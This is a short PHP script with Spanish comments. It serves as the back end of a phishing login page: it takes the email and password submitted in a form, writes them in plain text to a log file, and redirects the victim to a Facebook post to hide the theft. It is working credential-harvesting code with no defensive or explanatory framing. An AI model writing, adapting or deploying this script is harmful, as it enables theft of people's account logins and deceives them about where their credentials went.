<?php
// Obtener los valores de correo y contraseña del formulario
$correo = $_POST['correo'];
$contraseña = $_POST['contraseña'];

// Abrir el archivo de registro en modo de escritura al final del archivo
$archivo = fopen("registro.log", "a");

// Escribir los valores de correo y contraseña en el archivo de registro
fwrite($archivo, "Correo: " . $correo . "\n");
fwrite($archivo, "Contraseña: " . $contraseña . "\n");
fwrite($archivo, "\n");

// Cerrar el archivo de registro
fclose($archivo);

// Redirigir al usuario a una página de confirmación de inicio de sesión
header("Location: https://www.facebook.com/post/8524520520");
exit();
?>
